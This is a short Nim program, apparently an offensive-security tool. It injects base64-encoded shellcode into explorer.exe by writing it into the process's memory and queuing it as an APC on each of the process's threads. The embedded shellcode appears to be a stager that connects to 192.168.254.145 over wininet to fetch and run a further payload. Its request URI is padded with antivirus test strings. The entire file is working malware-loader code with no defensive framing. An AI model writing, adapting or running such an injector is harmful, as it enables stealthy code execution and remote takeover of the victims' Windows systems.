import base64

import winim
import winim/lean

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc apcQueue[byte](shellcode: openArray[byte]): void =
  var
    entry: PROCESSENTRY32
    threadEntry: THREADENTRY32
    hSnapshot: HANDLE
    bytesWritten: SIZE_T
    processEntry: PROCESSENTRY32
    threadIds: seq[int] = @[]   
    oldprotect: DWORD = 0


  entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  threadEntry.dwSize = cast[DWORD](sizeof(THREADENTRY32))
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS or TH32CS_SNAPTHREAD, 0)
  defer: CloseHandle(hSnapshot)

  let processName = r"explorer.exe"

  if Process32First(hSnapshot, addr entry):
    while Process32Next(hSnapshot, addr entry):
      if entry.szExeFile.toString == processName:
        processEntry = entry

  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID)
  let rPtr = VirtualAllocEx(pHandle, nil, cast[DWORD](shellcode.len), MEM_COMMIT, PAGE_READWRITE)
  let apcRoutine = cast[PTHREAD_START_ROUTINE](rPtr)

  WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
  VirtualProtectEx(pHandle, rPtr, len(shellcode), PAGE_EXECUTE_READ, addr oldprotect)

  if Thread32First(hSnapshot, addr threadEntry):
    while Thread32Next(hSnapshot, addr threadEntry):
      if threadEntry.th32OwnerProcessID == processEntry.th32ProcessID:
        threadIds.add(threadEntry.th32ThreadID)
  
  for threadId in threadIds:
    let tHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, cast[DWORD](threadId))
    QueueUserAPC(cast[PAPCFUNC](apcRoutine), tHandle, cast[ULONG_PTR](nil))
    Sleep(1000 * 2)  
 
  
when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8vdlBMSwA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy4wLjA0NTA2LjMwKQ0KADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSQBBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTQ1AAAAAAA=" 

  let shellcode = toByteSeq(decode(enc))
  apcQueue(shellcode)
